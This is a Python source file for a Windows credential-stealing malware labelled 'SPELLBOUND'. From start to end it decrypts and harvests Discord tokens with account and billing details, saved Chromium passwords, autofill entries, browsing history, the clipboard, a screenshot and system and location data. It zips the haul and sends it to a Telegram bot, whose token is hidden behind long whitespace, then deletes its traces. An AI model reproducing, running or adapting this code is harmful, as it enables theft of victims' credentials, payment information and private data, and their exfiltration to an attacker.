import os
import re
import sys
import time
import json
import uuid
import winreg
import ctypes
import base64
import shutil
import socket
import base64
import sqlite3
import zipfile
import platform
import subprocess
import ctypes.wintypes

python_alias = sys.executable

localappdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

installation_folder = f"C:\\Users\\{os.getlogin()}\\My Games"
log_file = f"{installation_folder}\\{os.getlogin()}.zip"
discord_info = f"{installation_folder}\\Discord"
chromium_info = f"{installation_folder}\\Chromium Browsers"
softwares_info = f"{installation_folder}\\Softwares"

os.makedirs(installation_folder, exist_ok=True)
os.makedirs(discord_info, exist_ok=True)
os.makedirs(chromium_info, exist_ok=True)
os.makedirs(softwares_info, exist_ok=True)

file_header = """
┌───────────────────────────┐
│   GRABBED BY SPELLBOUND   │
└───────────────────────────┘
\n\n
"""

class Sys:
    def InstallPackages(packages):
        for package in packages:
            try:
                subprocess.run([python_alias, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                subprocess.run(["pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

    def KillProcess(processName):
        result = subprocess.run(["tasklist"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        if processName not in result.stdout:
            return
        subprocess.run(["taskkill", "/F", "/IM", processName], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

    def Remove(path):
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception as e:
            pass

    def GetFolderSize(path):
        total_size = 0
        for dirpath, _, filenames in os.walk(path):
            for f in filenames:
                fp = os.path.join(dirpath, f)
                if os.path.exists(fp):
                    total_size += os.path.getsize(fp)
        return total_size


def AddFolderToZip(zipFile, folderPath, arcBase=""):
    for root, dirs, files in os.walk(folderPath):
        for file in files:
            file_path = os.path.join(root, file)
            arcname = os.path.relpath(file_path, start=folderPath)
            if arcBase:
                arcname = os.path.join(arcBase, arcname)
            zipFile.write(file_path, arcname)

def AutoDelete():
    subprocess.Popen(["cmd.exe", "/C", "ping", "localhost", "-n", "5", "&&", "del", "/F", f"\"{__file__}\""])
    sys.exit()

Sys.InstallPackages(packages=["requests", "pycryptodome", "pillow"])
import requests
from PIL import Image
from Crypto.Cipher import AES

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= DISCORD ============================================================================================================== #
discordRegexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
discordRegexpEnc = r"dQw4w9WgXcQ:[^\"]*"
__DISCORD_TOKENS__ = []
__USER_EMAILS__ = []
discordUIDS = []
discordCommonPaths = {'Discord': roaming + '\\discord\\Local Storage\\leveldb\\','Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\','Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\','Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\','Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo': localappdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch': localappdata + '\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa': localappdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum': localappdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser': localappdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star': localappdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik': localappdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi': localappdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS': localappdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome': localappdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1': localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2': localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3': localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4': localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5': localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser': localappdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge': localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\','Uran': localappdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium': localappdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
total_discord_token = 0

def ValidateToken(token: str) -> bool:
    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
    if r.status_code == 200: 
        return True
    return False

def DecryptVal(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass
    
def GetMasterKey(path: str) -> str:
    if not os.path.exists(path):
        return None
    if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
        return None

    with open(path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

    pDataIn = DATA_BLOB(len(master_key), ctypes.cast(master_key, ctypes.POINTER(ctypes.c_ubyte)))
    pDataOut = DATA_BLOB()

    if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
        decrypted_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
        ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
        return decrypted_key

def ExtractInfosFromToken():
    if not __DISCORD_TOKENS__:
        return

    final_to_return = []
    for token in __DISCORD_TOKENS__:
        user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()

        username = user['username'] + '#' + user['discriminator']
        user_id = user['id']
        email = user['email']
        phone = user['phone']
        mfa = user['mfa_enabled']

        if user['premium_type'] == 0:
            nitro = 'None'
        elif user['premium_type'] == 1:
            nitro = 'Nitro Classic'
        elif user['premium_type'] == 2:
            nitro = 'Nitro'
        elif user['premium_type'] == 3:
            nitro = 'Nitro Basic'
        else:
            nitro = 'None'

        if billing:
            payment_methods = []
            for method in billing:
                if method['type'] == 1:
                    payment_methods.append('Credit Card')
                elif method['type'] == 2:
                    payment_methods.append('PayPal')
                else:
                    payment_methods.append('Unknown')
            payment_methods = ', '.join(payment_methods)
        else:
            payment_methods = None

        final_message = (f"│👤 Username: {username} ({user_id})\n"
                         f"│🔑 Token: {token}\n"
                         f"│⚡ Nitro: {nitro}\n"
                         f"│💳 Billing: {payment_methods if payment_methods != "" else "None"}\n"
                         f"│🔗 MFA: {mfa}\n"
                         f"│🌐 Email: {email if email != None else "None"}\n"
                         f"│📞 Phone: {phone if phone != None else "None"}\n")
        final_to_return.append(final_message)

        if email != None:
            __USER_EMAILS__.append(email)

    return final_to_return

def DiscordGetTokens():
    for name, path in discordCommonPaths.items():
        if not os.path.exists(path): continue
        _discord = name.replace(" ", "").lower()
        if "cord" in path:
            if not os.path.exists(roaming + f'\{_discord}\Local State'): continue
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]: continue
                for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for y in re.findall(discordRegexpEnc, line):
                        token = DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), GetMasterKey(roaming + f'\{_discord}\Local State'))

                        if ValidateToken(token):
                            uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                            if uid not in discordUIDS:
                                __DISCORD_TOKENS__.append(token)
                                discordUIDS.append(uid)

        else:
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]: continue
                for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(discordRegexp, line):
                        if ValidateToken(token):
                            uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                            if uid not in discordUIDS:
                                __DISCORD_TOKENS__.append(token)
                                discordUIDS.append(uid)


try:
    DiscordGetTokens()
    
    tokens = ExtractInfosFromToken()
    with open(f"{discord_info}\\.tokens.txt", "w", encoding="utf-8") as writer:
        writer.write(file_header)
        writer.write("┌─────────────────────────────────────────────────────────\n")
        for token in tokens:
            writer.write(token)
            total_discord_token += 1
            writer.write("├─────────────────────────────────────────────────────────\n")
        
        writer.write("└─────────────────────────────────────────────────────────\n")

except Exception as e:
    pass


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= CHROMIUM ============================================================================================================= #
__CHROMIUM_PASSWORDS__ = []
__CHROMIUM_AUTOFILLS__ = []
__CHROMIUM_HISTORY__ = []
chromiumBrowsers = [{"name": "Google Chrome", "path": os.path.join(localappdata, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},{"name": "Microsoft Edge", "path": os.path.join(localappdata, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},{"name": "Opera", "path": os.path.join(roaming, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},{"name": "Opera GX", "path": os.path.join(roaming, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},{"name": "Brave", "path": os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},{"name": "Yandex", "path": os.path.join(roaming, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},]
chromiumSubpaths = [{"name": "None", "path": ""},{"name": "Default", "path": "Default"},{"name": "Profile 1", "path": "Profile 1"},{"name": "Profile 2", "path": "Profile 2"},{"name": "Profile 3", "path": "Profile 3"},{"name": "Profile 4", "path": "Profile 4"},{"name": "Profile 5", "path": "Profile 5"},]
totalPasswords = 0
totalAutofills = 0
totalHistory = 0

def ChromiumDecryptData(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

            pDataIn = DATA_BLOB(len(data), ctypes.cast(data, ctypes.POINTER(ctypes.c_ubyte)))
            pDataOut = DATA_BLOB()

            if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn),None,None,None,None,0,ctypes.byref(pDataOut)):
                decrypted_data = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
                return decrypted_data.decode()

        except Exception as e:
            return f"Failed to decrypt data: {e}"
        
def ChromiumGetPassword():
    for browser in chromiumBrowsers:
        Sys.KillProcess(browser['taskname'])
        local_state_path = os.path.join(browser['path'], 'Local State')
        if not os.path.exists(local_state_path):
            continue

        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)

        try:
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

            pDataIn = DATA_BLOB(len(key), ctypes.cast(key, ctypes.POINTER(ctypes.c_ubyte)))
            pDataOut = DATA_BLOB()

            if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
                decryption_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
            else:
                raise ValueError("Failed to decrypt master key.")
        except Exception as e:
            continue

        for subpath in chromiumSubpaths:
            login_data_path = os.path.join(browser['path'], subpath['path'], 'Login Data')
            if not os.path.exists(login_data_path):
                continue

            try:
                temp_db = os.path.join(browser['path'], subpath['path'], f"{browser['name']}-pw.db")
                shutil.copy(login_data_path, temp_db)

                connection = sqlite3.connect(temp_db)
                cursor = connection.cursor()
                query_passwords = "SELECT origin_url, username_value, password_value FROM logins"
                cursor.execute(query_passwords)

                for row in cursor.fetchall():
                    origin_url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    password = ChromiumDecryptData(encrypted_password, decryption_key)

                    if username or password:
                        __CHROMIUM_PASSWORDS__.append(
                            {
                                "browser": browser["name"],
                                "url": origin_url,
                                "username": username,
                                "password": password,
                            }
                        )

                cursor.close()
                connection.close()
                os.remove(temp_db)

            except Exception as e:
                continue

def ChromiumGetAutofill():
    for browser in chromiumBrowsers:
        Sys.KillProcess(browser["name"])
        browser_path = browser["path"]
        if not os.path.exists(browser_path):
            continue

        for profile in chromiumSubpaths:
            profile_path = os.path.join(browser_path, profile["path"])
            web_data_path = os.path.join(profile_path, "Web Data")

            if os.path.exists(web_data_path):
                temp_copy = web_data_path + "_temp"
                shutil.copy2(web_data_path, temp_copy)

                try:
                    conn = sqlite3.connect(temp_copy)
                    cursor = conn.cursor()

                    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                    tables = [table[0] for table in cursor.fetchall()]
                    if "autofill" in tables:
                        cursor.execute("SELECT name, value FROM autofill")
                        autofills = cursor.fetchall()

                        for autofill in autofills:
                            autofill_entry = (
                                f"│👤 Name: {autofill[0]}\n"
                                f"│🔑 Value: {autofill[1]}\n"
                                f"├─────────────────────────────────────────────────────────\n"
                            )
                            __CHROMIUM_AUTOFILLS__.append(autofill_entry)

                    conn.close()
                except sqlite3.Error as e:
                    pass
                finally:
                    os.remove(temp_copy)

def ChromiumGetHistory():
    for browser in chromiumBrowsers:
        Sys.KillProcess(browser["name"])
        history_path = f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Default/History"
        conn = sqlite3.connect(history_path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
        rows = cursor.fetchall()
        conn.close()
        for row in rows:
            history_entry = f"│🌐 Url: {row[0]}\n│🔗 Title: {row[1]}\n├─────────────────────────────────────────────────────────\n"
            __CHROMIUM_HISTORY__.append(history_entry)

try:
    ChromiumGetPassword()

    formatted = "┌─────────────────────────────────────────────────────────\n"
    for entry in __CHROMIUM_PASSWORDS__:
        formatted += (
            f"│🌐 URL:            {entry['url']}\n"
            f"│👤 Username:       {entry['username']}\n"
            f"│🔑 Password:       {entry['password']}\n"
            f"├─────────────────────────────────────────────────────────\n")
        totalPasswords += 1
    
    formatted += "└─────────────────────────────────────────────────────────"

    with open(f"{chromium_info}\\.passwords.txt", "w", encoding="utf-8") as writer:
        writer.write(file_header)
        writer.write(formatted)

except Exception as e:
    print(e)

try:
    ChromiumGetAutofill()

    with open(f"{chromium_info}\\.autofills.txt", "w", encoding="utf-8") as writer:
        writer.write(file_header)
        writer.write("┌─────────────────────────────────────────────────────────\n")
        for autofill in __CHROMIUM_AUTOFILLS__:
            writer.write(autofill)
            totalAutofills += 1

        writer.write("└─────────────────────────────────────────────────────────\n")

except Exception as e:
    print(e)

try:
    ChromiumGetHistory()

    with open(f"{chromium_info}\\.history.txt", "w", encoding="utf-8") as writer:
        writer.write(file_header)
        writer.write("┌─────────────────────────────────────────────────────────\n")
        for entry in __CHROMIUM_HISTORY__:
            writer.write(entry)
            totalHistory += 1

        writer.write("└─────────────────────────────────────────────────────────\n")

except Exception as e:
    print(e)


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= CLIPBOARD ============================================================================================================== #
__CLIPBOARD__ = subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode(errors="ignore").strip()

try:
    if __CLIPBOARD__ != "":
        with open(f"{installation_folder}\\.clipboard.txt", "w", encoding="utf-8") as writer:
            writer.write(file_header)
            writer.write(__CLIPBOARD__)
    else:
        with open(f"{installation_folder}\\.clipboard.txt", "w", encoding="utf-8") as writer:
            writer.write("Empty !")

except Exception as e:
    print(e)


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= FILES ================================================================================================================ #
class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [("biSize", ctypes.wintypes.DWORD),("biWidth", ctypes.wintypes.LONG),("biHeight", ctypes.wintypes.LONG),("biPlanes", ctypes.wintypes.WORD),("biBitCount", ctypes.wintypes.WORD),("biCompression", ctypes.wintypes.DWORD),("biSizeImage", ctypes.wintypes.DWORD),("biXPelsPerMeter", ctypes.wintypes.LONG),("biYPelsPerMeter", ctypes.wintypes.LONG),("biClrUsed", ctypes.wintypes.DWORD),("biClrImportant", ctypes.wintypes.DWORD),]

try:
    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)
    hdc_screen = user32.GetDC(0)
    hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
    hbm = gdi32.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
    gdi32.SelectObject(hdc_mem, hbm)
    gdi32.BitBlt(hdc_mem, 0, 0, screen_width, screen_height, hdc_screen, 0, 0, 0x00CC0020)
    bmp_info = BITMAPINFOHEADER()
    bmp_info.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    bmp_info.biWidth = screen_width
    bmp_info.biHeight = -screen_height
    bmp_info.biPlanes = 1
    bmp_info.biBitCount = 32
    bmp_info.biCompression = 0
    buffer_size = screen_width * screen_height * 4
    buffer = ctypes.create_string_buffer(buffer_size)
    gdi32.GetDIBits(hdc_screen, hbm, 0, screen_height, buffer, ctypes.byref(bmp_info), 0)
    gdi32.DeleteObject(hbm)
    gdi32.DeleteDC(hdc_mem)
    user32.ReleaseDC(0, hdc_screen)
    image = Image.frombuffer("RGB", (screen_width, screen_height), buffer, "raw", "BGRX", 0, 1)
    image.save(f"{installation_folder}\\.desktop.png")
except Exception as e:
    print(e)


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= INFO PC ============================================================================================================== #
requInfos = requests.get('https://ipinfo.io')
data = requInfos.json()

session = os.getlogin()
computer_name = socket.gethostname()
os_version = platform.system() + " " + platform.release()
architecture = platform.machine()
mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
ip = data.get('ip')
country = data.get('country')
region = data.get('region')
city = data.get('city')
loc = data.get('loc')
org = data.get('org')
cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip().split('\n')[2]

with open(f"{installation_folder}\\.computer.txt", "w", encoding="utf-8") as writer:
    writer.write(file_header)

    writer.write(f"""👤 Session Name: {session}
👥 Computer Name: {computer_name}
💻 OS: {os_version}
🛠 Architecture: {architecture}
📡 MAC: {mac}
⚙ CPU: {cpu}
📌 IP: {ip}
🌍 Country: {country}
🗺 Region: {region}
🏠 City: {city}
🧭 Localisation: {loc}
⚡ Internet Provider: {org}
""")

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= INSTALLED SOFTWARES ================================================================================================== #
with open(f"{softwares_info}\\.installed-browsers.txt", "w", encoding="utf-8") as writer:
    writer.write(file_header)

    writer.write("=== Installed Browsers ===\n")
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Clients\StartMenuInternet") as key:
            for i in range(winreg.QueryInfoKey(key)[0]):
                writer.write(f"{winreg.EnumKey(key, i)}\n")
    except FileNotFoundError:
        pass

with open(f"{softwares_info}\\.installed-softwares.txt", "w", encoding="utf-8") as writer:
    writer.write(file_header)

    key_paths = [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]

    writer.write("=== Installed Softwares ===\n")

    for key_path in key_paths:
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    subkey_name = winreg.EnumKey(key, i)
                    try:
                        with winreg.OpenKey(key, subkey_name) as subkey:
                            name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                            writer.write(f"{name}\n")
                    except FileNotFoundError:
                        continue
        except FileNotFoundError:
            continue

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= BUILD LOG ============================================================================================================ #
with zipfile.ZipFile(log_file, "w") as zip_file:
    zip_file.write(f"{installation_folder}\\.desktop.png", arcname=".desktop.png")
    zip_file.write(f"{installation_folder}\\.clipboard.txt", arcname=".clipboard.txt")
    zip_file.write(f"{installation_folder}\\.computer.txt", arcname=".computer.txt")
    AddFolderToZip(zip_file, discord_info, arcBase="Discord")
    AddFolderToZip(zip_file, chromium_info, arcBase="Chromium Browsers")
    AddFolderToZip(zip_file, softwares_info, arcBase="Softwares")


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= SEND DATA ============================================================================================================ #
channel_id = "-1002458809139"                                                                                                                                                                                                                                                                                                                                                             ;bot = "7931282619:AAEW3bNWCj3Pjj6n-SHew1fSgryTtjtBRr4"
message = f"""
<u><b>System Infos :</b></u>
👤 Session Name: {session}
👥 Computer Name: {computer_name}
💻 OS: {os_version}
🛠 Architecture: {architecture}
📡 MAC: {mac}
📌 IP: {ip}
🌍 Country: {country}

<u><b>Available Infos :</b></u>
🔵 Discord Account: {total_discord_token}
⌨ Passwords: {totalPasswords}
📑 Auto-fills: {totalAutofills}
🗂 History: {totalHistory}"""

url = f"https://api.telegram.org/bot{bot}/sendDocument"
with open(log_file, "rb") as file:
    files = {"document": file}
    data = {"chat_id": channel_id, "caption": message, "parse_mode": "HTML"}
    res = requests.post(url, data=data, files=files)

Sys.Remove(log_file)
Sys.Remove(f"{installation_folder}\\.desktop.png")
Sys.Remove(f"{installation_folder}\\.clipboard.txt")
Sys.Remove(f"{installation_folder}\\.computer.txt")
shutil.rmtree(discord_info)
shutil.rmtree(softwares_info)
shutil.rmtree(chromium_info)
